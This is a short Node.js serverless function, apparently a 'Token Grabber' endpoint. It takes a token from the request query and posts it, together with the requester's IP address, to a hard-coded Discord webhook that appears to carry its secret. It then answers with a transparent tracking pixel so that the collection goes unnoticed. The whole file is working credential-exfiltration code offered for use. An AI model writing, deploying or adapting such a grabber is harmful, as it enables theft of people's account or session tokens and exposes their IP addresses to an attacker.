const axios = require('axios');

module.exports = async (req, res) => {
  try {
    // Your Discord webhook URL (replace with actual)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471811275422957580/DXYSo17alHTrrSPsq7sfLRNNGMdl4C1MxhTl5Azhyn4WSFa1xLgdTWx2uPJmRKKhWZkT";

    const token = req.query.token;

    if (!token) {
      return res.status(400).json({ error: 'No token provided' });
    }

    // Prepare the webhook payload
    const webhookPayload = {
      content: `🔑 **New Token Captured** 🔑\n\`\`\`${token}\`\`\`\nIP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}`,
      username: "Token Grabber",
      avatar_url: "https://cdn-icons-png.flaticon.com/512/104/104710.png"
    };

    // Send to Discord webhook
    await axios.post(WEBHOOK_URL, webhookPayload);

    // Return transparent pixel
    const pixel = Buffer.from([
      0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
      0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21,
      0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
      0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
      0x01, 0x00, 0x3b
    ]);

    res.setHeader('Content-Type', 'image/gif');
    res.status(200).send(pixel);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Internal Server Error',
      details: error.message
    });
  }
};
